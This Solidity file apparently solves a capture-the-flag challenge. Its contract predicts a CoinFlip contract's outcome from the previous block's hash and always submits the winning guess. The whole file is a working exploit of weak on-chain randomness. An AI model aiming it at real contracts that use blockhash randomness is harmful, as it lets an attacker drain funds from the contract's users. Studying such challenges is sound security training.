//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Cassandra {
    CoinFlip coinFlip = CoinFlip(0xac90a01BAAb137e6797F7eCc8Fe8bd1dbbb0bbe8);

    function predict() public {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (blockValue / factor == 1) {
            coinFlip.flip(true);
        } else {
            coinFlip.flip(false);
        }
    }
}